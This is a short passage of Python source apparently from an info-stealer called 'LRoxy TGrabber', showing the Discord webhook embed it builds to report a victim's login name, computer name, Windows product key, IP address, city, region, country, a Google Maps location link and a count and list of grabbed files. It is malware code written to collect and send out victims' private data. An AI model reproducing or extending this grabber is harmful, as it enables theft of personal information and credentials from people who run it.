            ...
            "embeds": [
                {
                    "author": {
                        "name": "LRoxy TGRabber",
                        "url": "https://i.hizliresim.com/om9pda4.PNG",
                        "icon_url": "https://i.hizliresim.com/om9pda4.PNG"
                    },
                    "description": f'**{os.getlogin()}** Just ran LRoxy TGrabber\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,
